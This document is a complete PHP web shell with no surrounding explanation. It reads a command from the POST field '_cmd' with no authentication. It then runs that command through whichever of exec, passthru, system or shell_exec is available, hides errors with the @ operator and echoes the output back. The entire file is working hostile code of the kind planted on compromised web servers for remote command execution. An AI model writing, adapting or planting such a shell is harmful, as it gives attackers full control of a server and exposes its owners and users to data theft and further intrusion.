<?php
function cust_function_exists($function) {
  return function_exists($function);
}

function system_custom($in) {

    $out = '';
    $system = false ;
    if (cust_function_exists('exec')) {
        $system = true ;
        @exec($in,$out);
		$out = @join("\n",$out);
    } elseif (cust_function_exists('passthru')) {
        $system = true ;
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
    } elseif (cust_function_exists('system')) {
        $system = true ;
		ob_start();
		@system($in);
		$out = ob_get_clean();
    } elseif (cust_function_exists('shell_exec')) {
        $system = true ;
		$out = shell_exec($in);
    } 
    if($system) 
        return $out;
    

    
    return $out ;

}

$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$out = system_custom($currentCMD);
echo $out ;
?>